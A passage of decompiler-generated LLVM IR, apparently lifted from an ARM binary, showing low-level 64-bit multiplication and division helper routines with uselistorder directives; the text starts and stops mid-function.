
bb20:                                             ; preds = %bb19, %.thread3
  %v0_17608 = phi i32 [ %v6_17604, %.thread3 ], [ %v2_17600, %bb19 ]
  %v4_17608 = udiv i32 %v1_17608, 8
  %v5_17608 = sub i32 %v0_17608, %v4_17608
  %tmp = mul i32 %v5_17608, -8388608
  %v5_1760c = add i32 %v1_175d0, %tmp
  %v5_17610 = icmp slt i32 %v0_17608, %v4_17608
  br i1 %v5_17610, label %dec_label_pc_17630, label %dec_label_pc_17614

dec_label_pc_17614:                               ; preds = %bb20
  %v7_17614 = shl i32 %v0_17584, %v5_17608
  %v8_17614 = add i32 %v5_1760c, %v7_17614
  store i32 0, i32* %ip.global-to-local, align 4
  %v25_17624 = icmp eq i32 %v8_17614, 0
  br i1 %v25_17624, label %bb21, label %bb22

bb21:                                             ; preds = %dec_label_pc_17614
  br label %bb22

bb22:                                             ; preds = %bb23, %dec_label_pc_17630, %dec_label_pc_17614, %bb21
  %v1_1762c = phi i32 [ %v8_17614, %dec_label_pc_17614 ], [ 0, %bb21 ], [ %v11_17640, %dec_label_pc_17630 ], [ 0, %bb23 ]
  ret i32 %v1_1762c

dec_label_pc_17630:                               ; preds = %bb20
  %v1_17630 = add i32 %v5_17608, 32
  %v6_17634 = shl i32 %v0_17584, %v1_17630
  store i32 %v6_17634, i32* %ip.global-to-local, align 4
  %v1_17638 = sub i32 0, %v5_17608
  %v3_17640 = sub i32 -1, %v5_17608
  %v4_17640 = shl i32 1, %v3_17640
  %v5_17640 = and i32 %v4_17640, %v0_17584
  %v6_17640 = icmp ne i32 %v5_17640, 0
  %v7_17640 = lshr i32 %v0_17584, %v1_17638
  %v9_17640 = add i32 %v5_1760c, %v7_17640
  %v10_17640 = zext i1 %v6_17640 to i32
  %v11_17640 = add i32 %v10_17640, %v9_17640
  %v25_17640 = icmp eq i32 %v11_17640, 0
  br i1 %v25_17640, label %bb23, label %bb22

bb23:                                             ; preds = %dec_label_pc_17630
  br label %bb22

; uselistorder directives
  uselistorder i32 %v11_17640, { 1, 0 }
  uselistorder i32 %v5_1760c, { 1, 0 }
  uselistorder i32 %v5_17608, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_17608, { 1, 0 }
  uselistorder i32 %v0_17608, { 1, 0 }
  uselistorder i32 %v4_175f4, { 2, 1, 0 }
  uselistorder i32 %v1_175f4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_175e8, { 2, 1, 0 }
  uselistorder i32 %v1_175e8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_175dc, { 2, 1, 0 }
  uselistorder i32 %v0_175d8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17584, { 1, 0, 2, 3 }
  uselistorder i32 3, { 68, 0, 24, 121, 37, 133, 122, 123, 124, 2, 125, 69, 70, 71, 72, 73, 74, 67, 126, 5, 127, 128, 134, 129, 75, 130, 76, 38, 81, 25, 82, 26, 83, 3, 84, 85, 86, 39, 6, 110, 40, 111, 41, 112, 42, 113, 43, 114, 44, 115, 45, 116, 27, 117, 46, 118, 47, 119, 48, 87, 88, 49, 89, 50, 28, 92, 51, 52, 53, 54, 1, 90, 91, 55, 8, 7, 56, 93, 29, 94, 10, 9, 57, 30, 95, 12, 11, 58, 96, 31, 97, 14, 13, 59, 98, 32, 99, 16, 15, 60, 100, 33, 101, 62, 102, 18, 17, 61, 103, 34, 104, 20, 19, 63, 105, 35, 106, 22, 21, 64, 107, 36, 108, 23, 109, 4, 120, 131, 77, 78, 79, 80, 65, 132, 66 }
  uselistorder i32 -4, { 6, 5, 23, 0, 21, 24, 25, 26, 7, 8, 1, 9, 10, 11, 12, 13, 14, 15, 2, 22, 16, 3, 27, 18, 19, 20, 4, 17 }
  uselistorder i32 15, { 11, 19, 0, 12, 13, 3, 14, 18, 4, 5, 6, 7, 8, 9, 1, 15, 10, 16, 2, 17 }
  uselistorder i32 -8, { 12, 11, 21, 13, 14, 15, 16, 17, 10, 18, 19, 20, 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 256, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 39, 36, 41, 42, 43, 40, 44, 105, 45, 113, 114, 46, 47, 48, 115, 49, 50, 51, 52, 53, 54, 106, 116, 107, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 108, 110, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 109, 111, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 112, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 117, 104, 118 }
  uselistorder i32 128, { 19, 8, 18, 17, 20, 16, 15, 14, 13, 12, 24, 0, 25, 22, 21, 9, 10, 23, 11, 2, 3, 4, 5, 6, 7, 26, 1, 27 }
  uselistorder i32 7, { 2, 1, 0, 32, 33, 34, 7, 36, 37, 16, 38, 17, 39, 5, 18, 49, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 40, 8, 41, 9, 10, 42, 29, 43, 11, 44, 12, 45, 13, 46, 14, 47, 6, 48, 3, 30, 50, 4, 31, 51, 52, 35, 15, 53 }
  uselistorder i32 23, { 1, 2, 0, 12, 13, 18, 22, 4, 14, 6, 15, 7, 16, 8, 17, 5, 19, 3, 20, 9, 21, 10, 11 }
  uselistorder label %bb22, { 0, 1, 3, 2 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %.thread1, { 2, 0, 1 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @function_1764c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1764c:
  %v0_17654 = call i32 @function_17668()
  ret i32 %v0_17654
}

define i32 @function_17668() local_unnamed_addr {
dec_label_pc_17668:
  %sl.global-to-local = alloca i32, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_17668 = load i32, i32* @r4, align 4
  store i32 %v3_17668, i32* %stack_var_-32, align 4
  %v12_17668 = load i32, i32* @r7, align 4
  %v21_17668 = load i32, i32* @sl, align 4
  %v0_1766c = load i32, i32* @r2, align 4
  store i32 %v0_1766c, i32* @r7, align 4
  %v0_17670 = load i32, i32* @r3, align 4
  store i32 %v0_17670, i32* @r8, align 4
  %v0_17674 = load i32, i32* @r0, align 4
  store i32 %v0_17674, i32* @sb, align 4
  %v0_17678 = load i32, i32* @r1, align 4
  store i32 %v0_17678, i32* @sl, align 4
  %v0_1767c = call i32 @function_17c98()
  %v1_1767c = sext i32 %v0_1767c to i64
  %v2_17680 = load i32, i32* @r8, align 4
  %v3_17680 = mul i32 %v2_17680, %v0_1767c
  store i32 %v3_17680, i32* @ip, align 4
  %v3_17684 = load i32, i32* @r7, align 4
  %v4_17684 = zext i32 %v3_17684 to i64
  %v5_17684 = mul nuw nsw i64 %v4_17684, %v1_1767c
  %v6_17684 = udiv i64 %v5_17684, 4294967296
  %v7_17684 = trunc i64 %v6_17684 to i32
  %v8_17684 = trunc i64 %v5_17684 to i32
  %v1_17688 = load i32, i32* @r1, align 4
  %v3_17688 = mul i32 %v1_17688, %v3_17684
  %v4_17688 = add i32 %v3_17688, %v3_17680
  %v2_1768c = add i32 %v4_17688, %v7_17684
  %v0_17694 = load i32, i32* @sb, align 4
  %v2_17694 = sub i32 %v0_17694, %v8_17684
  %v3_17694 = icmp uge i32 %v0_17694, %v8_17684
  %v0_17698 = load i32, i32* @sl, align 4
  %v3_17698 = icmp eq i1 %v3_17694, false
  %v4_17698 = sub i32 %v0_17698, %v2_1768c
  %v6_17698 = sext i1 %v3_17698 to i32
  %v7_17698 = add i32 %v6_17698, %v4_17698
  store i32 %v7_17698, i32* %sl.global-to-local, align 4
  %v1_176a4 = inttoptr i32 %tmp7 to i32*
  store i32 %v2_17694, i32* %v1_176a4, align 4
  %v3_176a4 = add i32 %tmp7, 4
  %v4_176a4 = inttoptr i32 %v3_176a4 to i32*
  %v5_176a4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v5_176a4, i32* %v4_176a4, align 4
  %v2_176a8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_176a8, i32* @r4, align 4
  store i32 %v12_17668, i32* @r7, align 4
  store i32 %v21_17668, i32* @sl, align 4
  ret i32 %v0_1767c

; uselistorder directives
  uselistorder i32 %v8_17684, { 1, 0 }
  uselistorder i64 %v5_17684, { 1, 0 }
  uselistorder i32 %v0_1767c, { 1, 0, 2 }
  uselistorder i32 %tmp7, { 1, 0 }
}

define i32 @function_176b0(i32 %arg1, i32 %arg2, i64 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_176b0:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r3, align 4
  %tmp = trunc i64 %arg3 to i32
  store i32 %tmp, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v21_176b0 = load i32, i32* @sl, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg2, i32* @sl, align 4
  %v0_176c4 = call i32 @function_176f8()
  %v1_176c8 = load i32, i32* @r8, align 4
  %v2_176c8 = mul i32 %v1_176c8, %v0_176c4
  %v1_176cc = zext i32 %v0_176c4 to i64
  %v2_176cc = load i32, i32* @r7, align 4
  %v3_176cc = zext i32 %v2_176cc to i64
  %v4_176cc = mul nuw i64 %v3_176cc, %v1_176cc
  %v5_176cc = udiv i64 %v4_176cc, 4294967296
  %v6_176cc = trunc i64 %v5_176cc to i32
  %v7_176cc = trunc i64 %v4_176cc to i32
  %v3_176d0 = mul i32 %v2_176cc, %arg2
  %v4_176d0 = add i32 %v3_176d0, %v2_176c8
  %v2_176d4 = add i32 %v4_176d0, %v6_176cc
  %v0_176dc = load i32, i32* @sb, align 4
  %v2_176dc = sub i32 %v0_176dc, %v7_176cc
  %v3_176dc = icmp uge i32 %v0_176dc, %v7_176cc
  %v0_176e0 = load i32, i32* @sl, align 4
  %v3_176e0 = icmp eq i1 %v3_176dc, false
  %v4_176e0 = sub i32 %v0_176e0, %v2_176d4
  %v6_176e0 = sext i1 %v3_176e0 to i32
  %v7_176e0 = add i32 %v6_176e0, %v4_176e0
  store i32 %v7_176e0, i32* %sl.global-to-local, align 4
  %v1_176ec = inttoptr i32 %arg5 to i32*
  store i32 %v2_176dc, i32* %v1_176ec, align 4
  %v3_176ec = add i32 %arg5, 4
  %v4_176ec = inttoptr i32 %v3_176ec to i32*
  %v5_176ec = load i32, i32* %sl.global-to-local, align 4
  store i32 %v5_176ec, i32* %v4_176ec, align 4
  store i32 %v21_176b0, i32* %sl.global-to-local, align 4
  ret i32 %v0_176c4

; uselistorder directives
  uselistorder i32 %v7_176cc, { 1, 0 }
  uselistorder i64 %v4_176cc, { 1, 0 }
  uselistorder i32 %v0_176c4, { 1, 2, 0 }
  uselistorder i32* @sb, { 6, 7, 102, 103, 8, 9, 104, 105, 107, 106, 109, 108, 110, 111, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 10, 112, 113, 114, 115, 116, 117, 118, 119, 120, 127, 128, 135, 136, 137, 138, 139, 129, 130, 1, 131, 2, 132, 133, 0, 134, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 121, 122, 123, 124, 23, 24, 25, 26, 27, 28, 29, 21, 22, 3, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 4, 57, 74, 75, 76, 77, 78, 79, 80, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 125, 126, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 5, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172 }
  uselistorder i32* @r8, { 18, 19, 136, 137, 236, 237, 238, 44, 0, 45, 46, 162, 163, 164, 165, 138, 139, 141, 140, 143, 142, 144, 145, 20, 166, 167, 168, 169, 170, 171, 239, 240, 241, 1, 242, 243, 244, 2, 245, 246, 21, 146, 147, 148, 149, 4, 150, 151, 152, 172, 173, 174, 175, 5, 198, 199, 200, 201, 202, 203, 204, 6, 16, 211, 176, 177, 178, 179, 180, 181, 182, 183, 192, 193, 7, 194, 195, 8, 196, 197, 184, 185, 186, 9, 187, 188, 189, 190, 191, 205, 10, 206, 207, 208, 209, 210, 247, 248, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 32, 153, 154, 155, 156, 56, 57, 11, 58, 59, 60, 61, 17, 62, 76, 77, 78, 82, 79, 80, 81, 83, 84, 47, 48, 49, 50, 51, 52, 53, 54, 55, 65, 63, 64, 15, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 85, 12, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 13, 123, 124, 125, 126, 127, 3, 128, 129, 130, 131, 133, 132, 134, 135, 157, 158, 159, 160, 161, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 14, 231, 232, 233, 234, 235 }
  uselistorder i32* @sl, { 11, 12, 13, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 2, 134, 135, 136, 137, 138, 139, 3, 140, 141, 158, 159, 245, 246, 247, 248, 142, 143, 144, 145, 146, 147, 148, 149, 150, 160, 5, 173, 174, 0, 4, 181, 182, 183, 161, 162, 6, 169, 170, 171, 172, 163, 164, 165, 166, 167, 168, 175, 176, 177, 178, 179, 180, 249, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 27, 29, 28, 22, 151, 152, 153, 154, 36, 7, 1, 37, 38, 39, 30, 31, 32, 33, 34, 35, 8, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 81, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 9, 117, 118, 119, 155, 156, 157, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 227, 224, 225, 226, 228, 229, 230, 231, 232, 233, 234, 236, 237, 235, 10, 238, 239, 240, 241, 242, 243, 244 }
  uselistorder i32 %arg5, { 1, 0 }
}

define i32 @function_176f8() local_unnamed_addr {
dec_label_pc_176f8:
  %fp.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v12_176f8 = load i32, i32* @r7, align 4
  %v27_176f8 = load i32, i32* @lr, align 4
  store i32 43936, i32* %r8.global-to-local, align 4
  %v0_17704 = load i32, i32* @r1, align 4
  %v1_17704 = icmp slt i32 %v0_17704, 0
  br i1 %v1_17704, label %dec_label_pc_17a8c, label %dec_label_pc_1772c

dec_label_pc_1772c:                               ; preds = %dec_label_pc_176f8
  store i32 0, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32* %r8.global-to-local, align 4
  %v0_1771c = load i32, i32* @r2, align 4
  store i32 %v0_1771c, i32* @r4, align 4
  %v0_17720 = load i32, i32* @r3, align 4
  %v1_1772c = icmp slt i32 %v0_17720, 0
  br i1 %v1_1772c, label %dec_label_pc_17aa4, label %dec_label_pc_17734

dec_label_pc_17734:                               ; preds = %dec_label_pc_17a8c, %dec_label_pc_1772c, %dec_label_pc_17aa4
  %v0_1772090 = phi i32 [ %v0_1772089, %dec_label_pc_17aa4 ], [ %v0_1772085, %dec_label_pc_17a8c ], [ %v0_17720, %dec_label_pc_1772c ]
  %v1_17a74 = phi i32 [ %v6_17aa8, %dec_label_pc_17aa4 ], [ %v0_1772085, %dec_label_pc_17a8c ], [ %v0_17720, %dec_label_pc_1772c ]
  %v0_1777c60 = phi i32 [ %stack_var_-56.2, %dec_label_pc_17aa4 ], [ -1, %dec_label_pc_17a8c ], [ 0, %dec_label_pc_1772c ]
  %v0_17888 = phi i32 [ %v1_17aa4, %dec_label_pc_17aa4 ], [ %v0_1771c84, %dec_label_pc_17a8c ], [ %v0_1771c, %dec_label_pc_1772c ]
  %v1_17780 = phi i32 [ %v0_1773828, %dec_label_pc_17aa4 ], [ %v6_17a90, %dec_label_pc_17a8c ], [ %v0_17704, %dec_label_pc_1772c ]
  %stack_var_-56.1 = phi i32 [ %v1_17ab0, %dec_label_pc_17aa4 ], [ -1, %dec_label_pc_17a8c ], [ 0, %dec_label_pc_1772c ]
  %v2_17734 = icmp eq i32 %v1_17a74, 0
  store i32 %v1_17780, i32* @r7, align 4
  store i32 %v0_17888, i32* %r6.global-to-local, align 4
  %v0_17740 = load i32, i32* @r0, align 4
  store i32 %v0_17740, i32* %sb.global-to-local, align 4
  br i1 %v2_17734, label %dec_label_pc_17748, label %dec_label_pc_17840

dec_label_pc_17748:                               ; preds = %dec_label_pc_17734
  %tmp = icmp ugt i32 %v0_17888, %v1_17780
  br i1 %tmp, label %dec_label_pc_17750, label %dec_label_pc_17880

dec_label_pc_17750:                               ; preds = %dec_label_pc_17748
  %v2_17750 = icmp ugt i32 %v0_17888, 65535
  br i1 %v2_17750, label %dec_label_pc_17c30, label %dec_label_pc_17758

dec_label_pc_17758:                               ; preds = %dec_label_pc_17750
  %v2_17758 = icmp ugt i32 %v0_17888, 254
  %v7_17758 = icmp eq i32 %v0_17888, 255
  %v2_1775c = xor i1 %v7_17758, true
  %v3_1775c = and i1 %v2_17758, %v2_1775c
  br i1 %v3_1775c, label %bb, label %bb123

bb:                                               ; preds = %dec_label_pc_17758
  br label %bb123

bb123:                                            ; preds = %dec_label_pc_17758, %bb
  %v0_1777c58 = phi i32 [ %v0_1777c60, %dec_label_pc_17758 ], [ 24, %bb ]
  %v2_17760 = xor i1 %v2_17758, true
  %v3_17760 = or i1 %v7_17758, %v2_17760
  br i1 %v3_17760, label %bb124, label %.thread94

bb124:                                            ; preds = %bb123
  br label %.thread94

.thread94:                                        ; preds = %bb123, %bb124
  %v0_1777c5792 = phi i32 [ 32, %bb124 ], [ %v0_1777c58, %bb123 ]
  %v1_1776c53 = phi i32 [ 0, %bb124 ], [ %v0_1772090, %bb123 ]
  br i1 %v3_1775c, label %bb125, label %bb126

bb125:                                            ; preds = %.thread94
  br label %bb126

bb126:                                            ; preds = %bb186, %bb185, %.thread94, %bb125
  %v0_1777c = phi i32 [ 16, %bb186 ], [ %v0_1777c59, %bb185 ], [ %v0_1777c5792, %.thread94 ], [ %v0_1777c5792, %bb125 ]
  %v1_1776c = phi i32 [ %v1_1776c54, %bb186 ], [ %v1_1776c54, %bb185 ], [ %v1_1776c53, %.thread94 ], [ 8, %bb125 ]
  %v6_1776c = lshr i32 %v0_17888, %v1_1776c
  %v4_17774 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32 36) to i32*), align 4
  %v2_17778 = add i32 %v4_17774, %v6_1776c
  %v3_17778 = inttoptr i32 %v2_17778 to i8*
  %v4_17778 = load i8, i8* %v3_17778, align 1
  %v6_17778 = zext i8 %v4_17778 to i32
  %v2_1777c = sub nsw i32 %v0_1777c, %v6_17778
  %v9_1777c = icmp eq i32 %v0_1777c, %v6_17778
  br i1 %v9_1777c, label %.thread2.thread20, label %bb128

.thread2.thread20:                                ; preds = %bb126
  %v3_1779024 = udiv i32 %v0_17888, 65536
  store i32 %v3_1779024, i32* %r8.global-to-local, align 4
  br label %bb129

bb128:                                            ; preds = %bb126
  %v7_17780 = shl i32 %v1_17780, %v2_1777c
  %v2_17784 = sub i32 32, %v2_1777c
  %v7_17788 = shl i32 %v0_17888, %v2_1777c
  store i32 %v7_17788, i32* %r6.global-to-local, align 4
  %v8_1778c = lshr i32 %v0_17740, %v2_17784
  %v9_1778c = or i32 %v8_1778c, %v7_17780
  store i32 %v9_1778c, i32* @r7, align 4
  %v3_17790 = udiv i32 %v7_17788, 65536
  store i32 %v3_17790, i32* %r8.global-to-local, align 4
  %v7_17794 = shl i32 %v0_17740, %v2_1777c
  store i32 %v7_17794, i32* %sb.global-to-local, align 4
  br label %bb129

bb129:                                            ; preds = %.thread2.thread20, %bb128
  %v0_1779c = phi i32 [ %v3_1779024, %.thread2.thread20 ], [ %v3_17790, %bb128 ]
  %v0_17798 = phi i32 [ %v1_17780, %.thread2.thread20 ], [ %v9_1778c, %bb128 ]
  store i32 %v0_17798, i32* @r0, align 4
  store i32 %v0_1779c, i32* @r1, align 4
  %v0_177a0 = call i32 @function_12920()
  %v0_177a4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_177a0, i32* %sl.global-to-local, align 4
  %v0_177ac = load i32, i32* @r7, align 4
  %v2_177b0 = call i32 @function_12a1c(i32 %v0_177ac, i32 %v0_177a4)
  %v0_177b4 = load i32, i32* %r6.global-to-local, align 4
  %v3_177b8 = urem i32 %v0_177b4, 65536
  store i32 %v3_177b8, i32* @r7, align 4
  %v2_177bc = mul i32 %v0_177a0, %v3_177b8
  %v0_177c0 = load i32, i32* %sb.global-to-local, align 4
  %v3_177c0 = udiv i32 %v0_177c0, 65536
  %v4_177c4 = mul i32 %v0_177a4, 65536
  %v5_177c4 = or i32 %v3_177c0, %v4_177c4
  %tmp191 = icmp ugt i32 %v2_177bc, %v5_177c4
  br i1 %tmp191, label %dec_label_pc_177d0, label %.thread95

dec_label_pc_177d0:                               ; preds = %bb129
  %v2_177d0 = add i32 %v5_177c4, %v0_177b4
  %v3_177d0 = icmp ult i32 %v2_177d0, %v5_177c4
  %v1_177d4 = add i32 %v0_177a0, -1
  store i32 %v1_177d4, i32* %sl.global-to-local, align 4
  br i1 %v3_177d0, label %.thread95, label %dec_label_pc_177dc

dec_label_pc_177dc:                               ; preds = %dec_label_pc_177d0
  %tmp192 = icmp ugt i32 %v2_177bc, %v2_177d0
  br i1 %tmp192, label %bb130, label %.thread95

bb130:                                            ; preds = %dec_label_pc_177dc
  %v5_177e0 = add i32 %v0_177a0, -2
  store i32 %v5_177e0, i32* %sl.global-to-local, align 4
  %v6_177e4 = add i32 %v2_177d0, %v0_177b4
  br label %.thread95

.thread95:                                        ; preds = %bb129, %dec_label_pc_177dc, %dec_label_pc_177d0, %bb130
  %v1_177e8 = phi i32 [ %v2_177d0, %dec_label_pc_177d0 ], [ %v5_177c4, %bb129 ], [ %v6_177e4, %bb130 ], [ %v2_177d0, %dec_label_pc_177dc ]
  %v2_177e8 = sub i32 %v1_177e8, %v2_177bc
  store i32 %v2_177e8, i32* @r4, align 4
  %v0_177ec = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_177ec, i32* @r1, align 4
  store i32 %v2_177e8, i32* @r0, align 4
  %v0_177f4 = call i32 @function_12920()
  store i32 %v0_177f4, i32* @r5, align 4
  %v0_17800 = load i32, i32* @r4, align 4
  %v2_17804 = call i32 @function_12a1c(i32 %v0_17800, i32 %v0_177ec)
  %v0_17808 = load i32, i32* @r7, align 4
  %v1_17808 = load i32, i32* @r5, align 4
  %v2_17808 = mul i32 %v1_17808, %v0_17808
  %v0_1780c = load i32, i32* %sb.global-to-local, align 4
  %v3_17810 = urem i32 %v0_1780c, 65536
  %v4_17814 = mul i32 %v0_177ec, 65536
  %v5_17814 = or i32 %v3_17810, %v4_17814
  %tmp193 = icmp ugt i32 %v2_17808, %v5_17814
  br i1 %tmp193, label %dec_label_pc_17820, label %bb132

dec_label_pc_17820:                               ; preds = %.thread95
  %v1_17820 = load i32, i32* %r6.global-to-local, align 4
  %v2_17820 = add i32 %v1_17820, %v5_17814
  %v3_17820 = icmp ult i32 %v2_17820, %v5_17814
  %v1_17824 = add i32 %v1_17808, -1
  br i1 %v3_17820, label %bb132, label %dec_label_pc_1782c

dec_label_pc_1782c:                               ; preds = %dec_label_pc_17820
  %tmp194 = icmp ugt i32 %v2_17808, %v2_17820
  br i1 %tmp194, label %bb131, label %bb132

bb131:                                            ; preds = %dec_label_pc_1782c
  %v5_17830 = add i32 %v1_17808, -2
  br label %bb132

bb132:                                            ; preds = %.thread95, %dec_label_pc_17820, %dec_label_pc_1782c, %bb131
  %v0_17834 = phi i32 [ %v1_17824, %dec_label_pc_17820 ], [ %v1_17808, %.thread95 ], [ %v1_17824, %dec_label_pc_1782c ], [ %v5_17830, %bb131 ]
  %v1_17834 = load i32, i32* %sl.global-to-local, align 4
  %v4_17834 = mul i32 %v1_17834, 65536
  %v5_17834 = or i32 %v4_17834, %v0_17834
  br label %dec_label_pc_17854

dec_label_pc_17840:                               ; preds = %dec_label_pc_17734
  %v9_17840 = icmp eq i32 %v1_17780, %v1_17a74
  %tmp195 = icmp ult i32 %v1_17780, %v1_17a74
  br i1 %tmp195, label %dec_label_pc_1784c, label %dec_label_pc_17a3c

dec_label_pc_1784c:                               ; preds = %bb156, %dec_label_pc_17840, %bb157
  br label %dec_label_pc_17854

dec_label_pc_17854:                               ; preds = %.thread13, %bb178, %dec_label_pc_17c24, %bb145, %bb132, %dec_label_pc_1784c
  %v0_1786c = phi i32 [ %v5_17bc8, %bb178 ], [ 1, %.thread13 ], [ %v1_17c24, %dec_label_pc_17c24 ], [ %v5_17a30, %bb145 ], [ %v5_17834, %bb132 ], [ 0, %dec_label_pc_1784c ]
  %v2_17860 = icmp eq i32 %stack_var_-56.1, 0
  br i1 %v2_17860, label %dec_label_pc_17874, label %dec_label_pc_1786c

dec_label_pc_1786c:                               ; preds = %dec_label_pc_17854
  %v1_1786c = sub i32 0, %v0_1786c
  br label %dec_label_pc_17874

dec_label_pc_17874:                               ; preds = %dec_label_pc_17854, %dec_label_pc_1786c
  %v1_1787c = phi i32 [ %v0_1786c, %dec_label_pc_17854 ], [ %v1_1786c, %dec_label_pc_1786c ]
  store i32 %v12_176f8, i32* @r7, align 4
  ret i32 %v1_1787c

dec_label_pc_17880:                               ; preds = %dec_label_pc_17748
  %v2_17880 = icmp eq i32 %v0_17888, 0
  br i1 %v2_17880, label %dec_label_pc_17888, label %dec_label_pc_17898

dec_label_pc_17888:                               ; preds = %dec_label_pc_17880
  store i32 0, i32* @r1, align 4
  store i32 1, i32* @r0, align 4
  %v0_17890 = call i32 @function_12920()
  store i32 %v0_17890, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17898

dec_label_pc_17898:                               ; preds = %dec_label_pc_17880, %dec_label_pc_17888
  %v0_178e8 = phi i32 [ %v0_17888, %dec_label_pc_17880 ], [ %v0_17890, %dec_label_pc_17888 ]
  %v3_1789c = icmp ult i32 %v0_178e8, 65534
  br i1 %v3_1789c, label %dec_label_pc_17abc, label %dec_label_pc_178a0

dec_label_pc_178a0:                               ; preds = %dec_label_pc_17898
  %v3_178a4 = icmp ugt i32 %v0_178e8, 16777214
  %v9_178a4 = icmp eq i32 %v0_178e8, 16777215
  %v2_178a8 = xor i1 %v9_178a4, true
  %v3_178a8 = and i1 %v3_178a4, %v2_178a8
  br i1 %v3_178a8, label %bb134, label %bb135

bb134:                                            ; preds = %dec_label_pc_178a0
  br label %bb135

bb135:                                            ; preds = %dec_label_pc_178a0, %bb134
  %v1_178b869 = phi i32 [ 16777215, %dec_label_pc_178a0 ], [ 24, %bb134 ]
  %v2_178ac = xor i1 %v3_178a4, true
  %v3_178ac = or i1 %v9_178a4, %v2_178ac
  br i1 %v3_178ac, label %bb136, label %bb137

bb136:                                            ; preds = %bb135
  br label %bb137

bb137:                                            ; preds = %bb135, %bb136
  %v1_178b868 = phi i32 [ %v1_178b869, %bb135 ], [ 16, %bb136 ]
  br i1 %v3_178a8, label %bb138, label %bb139

bb138:                                            ; preds = %bb137
  store i32 8, i32* @ip, align 4
  br label %bb139

bb139:                                            ; preds = %bb137, %bb138
  br i1 %v3_178ac, label %bb140, label %bb141

bb140:                                            ; preds = %bb139
  store i32 16, i32* @ip, align 4
  br label %bb141

bb141:                                            ; preds = %._crit_edge, %bb161, %bb139, %bb140
  %v1_178b8 = phi i32 [ %v1_178b8.pre, %._crit_edge ], [ 8, %bb161 ], [ %v1_178b868, %bb139 ], [ %v1_178b868, %bb140 ]
  %v6_178b8 = lshr i32 %v0_178e8, %v1_178b8
  %v0_178c0 = load i32, i32* %r8.global-to-local, align 4
  %v2_178c0 = add i32 %v0_178c0, 36
  %v3_178c0 = inttoptr i32 %v2_178c0 to i32*
  %v4_178c0 = load i32, i32* %v3_178c0, align 4
  %v2_178c4 = add i32 %v4_178c0, %v6_178b8
  %v3_178c4 = inttoptr i32 %v2_178c4 to i8*
  %v4_178c4 = load i8, i8* %v3_178c4, align 1
  %v6_178c4 = zext i8 %v4_178c4 to i32
  %v0_178c8 = load i32, i32* @ip, align 4
